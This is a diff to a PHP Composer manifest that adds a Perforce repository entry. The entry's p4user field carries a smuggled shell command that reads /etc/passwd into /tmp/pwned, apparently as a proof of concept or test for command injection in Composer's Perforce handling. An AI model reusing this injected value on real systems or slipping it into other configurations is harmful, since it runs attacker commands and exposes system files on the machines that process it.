@@ -8,10 +8,18 @@
             "name": "Pierre-Yves Guerder"
         }
     ],
-    "scripts": {
-        "post-update-cmd": [
-            "echo 'Hi!'"
-        ]
+    "require": {
+        "php": ">=7.4",
+        "dummy/perforce-package": "*"
     },
+    "repositories": [
+        {
+            "type": "perforce",
+            "url": "localhost:8080",
+            "depot": "depot",
+            "p4user": "user; head /etc/passwd > /tmp/pwned; cat /tmp/pwned #",
+            "p4password": "test"
+        }
+    ],
     "require": {}
 }
